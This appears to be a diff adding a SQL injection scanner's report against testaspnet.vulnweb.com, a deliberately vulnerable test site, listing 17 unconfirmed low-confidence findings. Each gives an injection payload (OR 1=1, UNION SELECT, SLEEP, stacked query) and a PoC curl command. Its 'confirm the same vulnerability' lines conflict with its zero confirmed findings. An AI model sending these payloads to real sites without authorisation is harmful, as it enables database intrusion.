@@ -1,0 +1,351 @@
+SQLi Scanner v7.2 — Security Findings Report
+══════════════════════════════════════════════════════════════════════
+Target    : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+Date      : 2026-08-14 09:30:50
+Logs      : ./testaspnet.vulnweb.com_endpoint_logs/
+
+  Summary
+══════════════════════════════════════════════════════════════════════
+    Total Tests Executed          : 20
+    Total Findings                : 17
+    Confirmed Vulnerabilities     : 0
+    Possible Vulnerabilities      : 17
+    Verified True Positives (TP)  : 0
+
+    CONFIRMED SQL INJECTION VULNERABILITIES  [High Confidence]
+══════════════════════════════════════════════════════════════════════
+    No confirmed SQL injection vulnerabilities detected.
+
+    POSSIBLE SQL INJECTION VULNERABILITIES  [Require Manual Verification]
+══════════════════════════════════════════════════════════════════════
+    Finding #1
+    - Timestamp       : 2026-08-14T09:30:29
+    - URL             : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+    - Method          : GET
+    - Vector          : query
+    - Parameter       : id
+    - Technique       : B
+    - Payload         : 1 OR 1=1
+    - Tag             : ctx_num_or
+    - Verdict         : sqli_possible
+    - Confidence      : Low
+    - MSS Score       : 27
+    - Response Time   : 1.66s
+    - Reason          : BaselineDiff: jaccard=0.71 size_ratio=3.26 sql_tokens=[]
+    - PoC curl        : curl -s -G 'http://testaspnet.vulnweb.com/Comments.aspx?id=0' --data-urlencode 'id=1 OR 1=1'
+
+    Finding #2
+    - Timestamp       : 2026-08-14T09:30:29
+    - URL             : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+    - Method          : GET
+    - Vector          : query
+    - Parameter       : id
+    - Technique       : E
+    - Payload         : ''
+    - Tag             : double_quote
+    - Verdict         : sqli_possible
+    - Confidence      : Low
+    - MSS Score       : 27
+    - Response Time   : 1.85s
+    - Reason          : BaselineDiff: jaccard=0.71 size_ratio=3.20 sql_tokens=[]
+    - PoC curl        : curl -s -G 'http://testaspnet.vulnweb.com/Comments.aspx?id=0' --data-urlencode 'id='''
+  ⚠  Multiple payloads confirm the same vulnerability on this endpoint.
+
+    Finding #3
+    - Timestamp       : 2026-08-14T09:30:29
+    - URL             : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+    - Method          : GET
+    - Vector          : query
+    - Parameter       : id
+    - Technique       : E
+    - Payload         : \
+    - Tag             : backslash
+    - Verdict         : sqli_possible
+    - Confidence      : Low
+    - MSS Score       : 27
+    - Response Time   : 1.87s
+    - Reason          : BaselineDiff: jaccard=0.71 size_ratio=3.20 sql_tokens=[]
+    - PoC curl        : curl -s -G 'http://testaspnet.vulnweb.com/Comments.aspx?id=0' --data-urlencode 'id=\'
+  ⚠  Multiple payloads confirm the same vulnerability on this endpoint.
+
+    Finding #4
+    - Timestamp       : 2026-08-14T09:30:29
+    - URL             : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+    - Method          : GET
+    - Vector          : query
+    - Parameter       : id
+    - Technique       : T
+    - Payload         : 1 AND SLEEP(5)
+    - Tag             : ctx_num_sleep
+    - Verdict         : sqli_possible
+    - Confidence      : Low
+    - MSS Score       : 20
+    - Response Time   : 0.68s
+    - Reason          : BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+    - PoC curl        : curl -s -G 'http://testaspnet.vulnweb.com/Comments.aspx?id=0' --data-urlencode 'id=1 AND SLEEP(5)'
+  ⚠  Multiple payloads confirm the same vulnerability on this endpoint.
+
+    Finding #5
+    - Timestamp       : 2026-08-14T09:30:29
+    - URL             : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+    - Method          : GET
+    - Vector          : query
+    - Parameter       : id
+    - Technique       : E
+    - Payload         : ' AND 1=CAST(sqlite_version() AS INTEGER)--
+    - Tag             : sqlite_cast
+    - Verdict         : sqli_possible
+    - Confidence      : Low
+    - MSS Score       : 20
+    - Response Time   : 0.58s
+    - Reason          : BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+    - PoC curl        : curl -s -G 'http://testaspnet.vulnweb.com/Comments.aspx?id=0' --data-urlencode 'id=' AND 1=CAST(sqlite_version() AS INTEGER)--'
+  ⚠  Multiple payloads confirm the same vulnerability on this endpoint.
+
+    Finding #6
+    - Timestamp       : 2026-08-14T09:30:29
+    - URL             : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+    - Method          : GET
+    - Vector          : query
+    - Parameter       : id
+    - Technique       : U
+    - Payload         : 1 UNION SELECT NULL--
+    - Tag             : ctx_num_union
+    - Verdict         : sqli_possible
+    - Confidence      : Low
+    - MSS Score       : 20
+    - Response Time   : 0.72s
+    - Reason          : BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+    - PoC curl        : curl -s -G 'http://testaspnet.vulnweb.com/Comments.aspx?id=0' --data-urlencode 'id=1 UNION SELECT NULL--'
+  ⚠  Multiple payloads confirm the same vulnerability on this endpoint.
+
+    Finding #7
+    - Timestamp       : 2026-08-14T09:30:29
+    - URL             : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+    - Method          : GET
+    - Vector          : query
+    - Parameter       : id
+    - Technique       : U
+    - Payload         : -1 UNION SELECT 1,2,3--
+    - Tag             : ctx_num_union_neg
+    - Verdict         : sqli_possible
+    - Confidence      : Low
+    - MSS Score       : 20
+    - Response Time   : 0.68s
+    - Reason          : BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+    - PoC curl        : curl -s -G 'http://testaspnet.vulnweb.com/Comments.aspx?id=0' --data-urlencode 'id=-1 UNION SELECT 1,2,3--'
+  ⚠  Multiple payloads confirm the same vulnerability on this endpoint.
+
+    Finding #8
+    - Timestamp       : 2026-08-14T09:30:29
+    - URL             : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+    - Method          : GET
+    - Vector          : query
+    - Parameter       : id
+    - Technique       : T
+    - Payload         : 1' AND SLEEP(5)--
+    - Tag             : ctx_num_time
+    - Verdict         : sqli_possible
+    - Confidence      : Low
+    - MSS Score       : 20
+    - Response Time   : 0.63s
+    - Reason          : BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+    - PoC curl        : curl -s -G 'http://testaspnet.vulnweb.com/Comments.aspx?id=0' --data-urlencode 'id=1' AND SLEEP(5)--'
+  ⚠  Multiple payloads confirm the same vulnerability on this endpoint.
+
+    Finding #9
+    - Timestamp       : 2026-08-14T09:30:29
+    - URL             : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+    - Method          : GET
+    - Vector          : query
+    - Parameter       : id
+    - Technique       : U
+    - Payload         : ' UNION SELECT sqlite_version()--
+    - Tag             : sqlite_version
+    - Verdict         : sqli_possible
+    - Confidence      : Low
+    - MSS Score       : 20
+    - Response Time   : 0.59s
+    - Reason          : BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+    - PoC curl        : curl -s -G 'http://testaspnet.vulnweb.com/Comments.aspx?id=0' --data-urlencode 'id=' UNION SELECT sqlite_version()--'
+  ⚠  Multiple payloads confirm the same vulnerability on this endpoint.
+
+    Finding #10
+    - Timestamp       : 2026-08-14T09:30:29
+    - URL             : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+    - Method          : GET
+    - Vector          : query
+    - Parameter       : id
+    - Technique       : E
+    - Payload         : ' AND randomblob(500000000)--
+    - Tag             : sqlite_time
+    - Verdict         : sqli_possible
+    - Confidence      : Low
+    - MSS Score       : 20
+    - Response Time   : 0.59s
+    - Reason          : BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+    - PoC curl        : curl -s -G 'http://testaspnet.vulnweb.com/Comments.aspx?id=0' --data-urlencode 'id=' AND randomblob(500000000)--'
+  ⚠  Multiple payloads confirm the same vulnerability on this endpoint.
+
+    Finding #11
+    - Timestamp       : 2026-08-14T09:30:29
+    - URL             : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+    - Method          : GET
+    - Vector          : query
+    - Parameter       : id
+    - Technique       : E
+    - Payload         : '
+    - Tag             : bare_quote
+    - Verdict         : sqli_possible
+    - Confidence      : Low
+    - MSS Score       : 20
+    - Response Time   : 0.56s
+    - Reason          : BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+    - PoC curl        : curl -s -G 'http://testaspnet.vulnweb.com/Comments.aspx?id=0' --data-urlencode 'id=''
+  ⚠  Multiple payloads confirm the same vulnerability on this endpoint.
+
+    Finding #12
+    - Timestamp       : 2026-08-14T09:30:32
+    - URL             : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+    - Method          : GET
+    - Vector          : query
+    - Parameter       : id
+    - Technique       : E
+    - Payload         : 1'
+    - Tag             : int_quote
+    - Verdict         : sqli_possible
+    - Confidence      : Low
+    - MSS Score       : 20
+    - Response Time   : 0.69s
+    - Reason          : BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+    - PoC curl        : curl -s -G 'http://testaspnet.vulnweb.com/Comments.aspx?id=0' --data-urlencode 'id=1''
+  ⚠  Multiple payloads confirm the same vulnerability on this endpoint.
+
+    Finding #13
+    - Timestamp       : 2026-08-14T09:30:33
+    - URL             : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+    - Method          : GET
+    - Vector          : query
+    - Parameter       : id
+    - Technique       : E
+    - Payload         : "
+    - Tag             : double_dquote
+    - Verdict         : sqli_possible
+    - Confidence      : Low
+    - MSS Score       : 20
+    - Response Time   : 0.71s
+    - Reason          : BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+    - PoC curl        : curl -s -G 'http://testaspnet.vulnweb.com/Comments.aspx?id=0' --data-urlencode 'id="'
+  ⚠  Multiple payloads confirm the same vulnerability on this endpoint.
+
+    Finding #14
+    - Timestamp       : 2026-08-14T09:30:33
+    - URL             : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+    - Method          : GET
+    - Vector          : query
+    - Parameter       : id
+    - Technique       : E
+    - Payload         : 1"
+    - Tag             : int_dquote
+    - Verdict         : sqli_possible
+    - Confidence      : Low
+    - MSS Score       : 20
+    - Response Time   : 0.75s
+    - Reason          : BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+    - PoC curl        : curl -s -G 'http://testaspnet.vulnweb.com/Comments.aspx?id=0' --data-urlencode 'id=1"'
+  ⚠  Multiple payloads confirm the same vulnerability on this endpoint.
+
+    Finding #15
+    - Timestamp       : 2026-08-14T09:30:40
+    - URL             : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+    - Method          : GET
+    - Vector          : query
+    - Parameter       : id
+    - Technique       : E
+    - Payload         : '/**/OR/**/1=1--
+    - Tag             : error_comment
+    - Verdict         : sqli_possible
+    - Confidence      : Low
+    - MSS Score       : 20
+    - Response Time   : 0.51s
+    - Reason          : BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+    - PoC curl        : curl -s -G 'http://testaspnet.vulnweb.com/Comments.aspx?id=0' --data-urlencode 'id='/**/OR/**/1=1--'
+  ⚠  Multiple payloads confirm the same vulnerability on this endpoint.
+
+    Finding #16
+    - Timestamp       : 2026-08-14T09:30:41
+    - URL             : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+    - Method          : GET
+    - Vector          : query
+    - Parameter       : id
+    - Technique       : B
+    - Payload         : ' OR 1=1--
+    - Tag             : classic_or_comment
+    - Verdict         : sqli_possible
+    - Confidence      : Low
+    - MSS Score       : 20
+    - Response Time   : 0.51s
+    - Reason          : BaselineDiff: jaccard=0.00 size_ratio=1.00 sql_tokens=[]
+    - PoC curl        : curl -s -G 'http://testaspnet.vulnweb.com/Comments.aspx?id=0' --data-urlencode 'id=' OR 1=1--'
+  ⚠  Multiple payloads confirm the same vulnerability on this endpoint.
+
+    Finding #17
+    - Timestamp       : 2026-08-14T09:30:29
+    - URL             : http://testaspnet.vulnweb.com/Comments.aspx?id=0
+    - Method          : GET
+    - Vector          : query
+    - Parameter       : id
+    - Technique       : S
+    - Payload         : 1; SELECT 1--
+    - Tag             : ctx_num_stacked
+    - Verdict         : sqli_possible
+    - Confidence      : Low
+    - MSS Score       : 0
+    - Response Time   : 0.97s
+    - Reason          : BaselineDiff: jaccard=1.00 size_ratio=0.00 sql_tokens=['select']
+    - PoC curl        : curl -s -G 'http://testaspnet.vulnweb.com/Comments.aspx?id=0' --data-urlencode 'id=1; SELECT 1--'
+  ⚠  Multiple payloads confirm the same vulnerability on this endpoint.
+
+  Analysis Summary
+══════════════════════════════════════════════════════════════════════
+    Total Confirmed Vulnerabilities   : 0 (across 0 unique endpoint(s))
+    Total Possible Indicators         : 17 (across 1 unique endpoint(s))
+
+    Possible findings are low-confidence indicators and require manual validation before being treated as confirmed vulnerabilities.
+
+    Baseline-diff assisted detection : 17 finding(s)
+
+    Per-endpoint scan logs saved to  : ./testaspnet.vulnweb.com_endpoint_logs/
+
+  Overall Severity : MEDIUM — Manual review required.
+
+══════════════════════════════════════════════════════════════════════
+
+  Final Summary
+══════════════════════════════════════════════════════════════════════
+    Total findings : 17  (Confirmed: 0  |  Possible: 17)
+
+  #    STATUS     METHOD  VECTOR     PARAM              URL                                        PAYLOAD                          CONF   TIME    TIMESTAMP
+  --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+  1    POSSIBLE   GET     query      id                 http://testaspnet.vulnweb.com/Comments.as  1 AND SLEEP(5)                   45%    0.68s   2026-08-14T09:30:29
+  2    POSSIBLE   GET     query      id                 http://testaspnet.vulnweb.com/Comments.as  ' AND 1=CAST(sqlite_version() A  45%    0.58s   2026-08-14T09:30:29
+  3    POSSIBLE   GET     query      id                 http://testaspnet.vulnweb.com/Comments.as  1; SELECT 1--                    45%    0.97s   2026-08-14T09:30:29
+  4    POSSIBLE   GET     query      id                 http://testaspnet.vulnweb.com/Comments.as  1 UNION SELECT NULL--            45%    0.72s   2026-08-14T09:30:29
+  5    POSSIBLE   GET     query      id                 http://testaspnet.vulnweb.com/Comments.as  1 OR 1=1                         45%    1.66s   2026-08-14T09:30:29
+  6    POSSIBLE   GET     query      id                 http://testaspnet.vulnweb.com/Comments.as  -1 UNION SELECT 1,2,3--          45%    0.68s   2026-08-14T09:30:29
+  7    POSSIBLE   GET     query      id                 http://testaspnet.vulnweb.com/Comments.as  1' AND SLEEP(5)--                45%    0.63s   2026-08-14T09:30:29
+  8    POSSIBLE   GET     query      id                 http://testaspnet.vulnweb.com/Comments.as  ' UNION SELECT sqlite_version()  45%    0.59s   2026-08-14T09:30:29
+  9    POSSIBLE   GET     query      id                 http://testaspnet.vulnweb.com/Comments.as  ' AND randomblob(500000000)--    45%    0.59s   2026-08-14T09:30:29
+  10   POSSIBLE   GET     query      id                 http://testaspnet.vulnweb.com/Comments.as  '                                45%    0.56s   2026-08-14T09:30:29
+  11   POSSIBLE   GET     query      id                 http://testaspnet.vulnweb.com/Comments.as  ''                               45%    1.85s   2026-08-14T09:30:29
+  12   POSSIBLE   GET     query      id                 http://testaspnet.vulnweb.com/Comments.as  \                                45%    1.87s   2026-08-14T09:30:29
+  13   POSSIBLE   GET     query      id                 http://testaspnet.vulnweb.com/Comments.as  1'                               45%    0.69s   2026-08-14T09:30:32
+  14   POSSIBLE   GET     query      id                 http://testaspnet.vulnweb.com/Comments.as  "                                45%    0.71s   2026-08-14T09:30:33
+  15   POSSIBLE   GET     query      id                 http://testaspnet.vulnweb.com/Comments.as  1"                               45%    0.75s   2026-08-14T09:30:33
+  16   POSSIBLE   GET     query      id                 http://testaspnet.vulnweb.com/Comments.as  '/**/OR/**/1=1--                 45%    0.51s   2026-08-14T09:30:40
+  17   POSSIBLE   GET     query      id                 http://testaspnet.vulnweb.com/Comments.as  ' OR 1=1--                       45%    0.51s   2026-08-14T09:30:41
+  --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+  Overall Severity : MEDIUM — Manual review required.
+
+══════════════════════════════════════════════════════════════════════
